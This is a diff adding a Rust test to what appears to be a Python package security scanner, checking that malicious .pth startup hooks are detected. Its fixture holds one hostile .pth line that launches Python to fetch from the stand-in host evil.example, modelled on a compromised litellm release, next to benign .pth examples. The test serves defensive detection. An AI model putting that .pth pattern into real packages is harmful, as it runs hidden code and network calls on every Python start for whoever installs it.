@@ -323,6 +323,31 @@ fn top_level_sitecustomize_is_install_surface() {
 }
 
 #[test]
+fn pth_startup_hooks_are_reported() {
+    // The litellm 1.82.8 shape: a .pth line launching Python on encoded code.
+    let bytes = zip_files(&[
+        ("demo/__init__.py", b""),
+        (
+            "demo_init.pth",
+            b"import os, subprocess, sys; subprocess.Popen([sys.executable, '-c', \
+              'import urllib.request; urllib.request.urlopen(\"https://evil.example/x\")'])\n",
+        ),
+        // Benign shapes: a path entry, a namespace shim, a feature switched on by env.
+        ("demo-nspkg.pth", b"import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], 'demo')\n"),
+        ("distutils-precedence.pth", b"import os; enabled = os.environ.get('X', 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();\n"),
+        ("extra.pth", b"../lib\n"),
+        (
+            "demo-1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
+        ),
+    ]);
+    let r = scan(&bytes, "demo-1.0-py3-none-any.whl");
+    assert_eq!(r.startup_hooks.len(), 1, "{:?}", r.startup_hooks);
+    assert!(r.startup_hooks[0].starts_with("demo_init.pth: proc_exec"));
+    assert!(r.startup_hooks[0].contains("network"));
+}
+
+#[test]
 fn src_layout_and_cmdclass_targets() {
     let bytes = tar_gz_files(&[
         ("lay-1.0/setup.cfg", "[metadata]\nname = lay\n[options]\ncmdclass =\n    install = lay_build.hooks.Install\n"),
